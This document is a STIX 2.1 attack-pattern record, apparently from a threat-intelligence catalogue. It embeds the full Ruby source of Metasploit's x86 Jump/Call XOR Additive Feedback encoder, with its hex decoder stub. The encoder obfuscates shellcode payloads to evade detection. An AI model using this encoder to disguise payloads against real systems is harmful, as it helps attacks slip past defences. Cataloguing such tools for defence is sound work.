{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4575c81-e1bb-479e-9794-4bc4cdcb4744",
    "created": "2024-08-14T16:33:19.206901Z",
    "modified": "2024-08-14T16:33:19.206905Z",
    "name": "Jump/Call XOR Additive Feedback Encoder",
    "description": "Jump/Call XOR Additive Feedback",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/jmp_call_additive.rb",
            "external_id": "jmp_call_additive.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::XorAdditiveFeedback\n\n  # Uncomment when we get the poly stuff working again.\n  #Rank = GreatRanking\n\n  def initialize\n    super(\n      'Name'             => 'Jump/Call XOR Additive Feedback Encoder',\n      'Description'      => 'Jump/Call XOR Additive Feedback',\n      'Author'           => 'skape',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'Stub'       =>\n            \"\\xfc\"                + # cld\n            \"\\xbbXORK\"            + # mov ebx, key\n            \"\\xeb\\x0c\"            + # jmp short 0x14\n            \"\\x5e\"                + # pop esi\n            \"\\x56\"                + # push esi\n            \"\\x31\\x1e\"            + # xor [esi], ebx\n            \"\\xad\"                + # lodsd\n            \"\\x01\\xc3\"            + # add ebx, eax\n            \"\\x85\\xc0\"            + # test eax, eax\n            \"\\x75\\xf7\"            + # jnz 0xa\n            \"\\xc3\"                + # ret\n            \"\\xe8\\xef\\xff\\xff\\xff\", # call 0x8\n          'KeyOffset' => 2,\n          'KeySize'   => 4,\n          'BlockSize' => 4,\n        })\n  end\n\n  #\n  # Append the termination block.\n  #\n  def encode_end(state)\n    state.encoded += [ state.key ].pack(state.decoder_key_pack)\n  end\nend\n"
}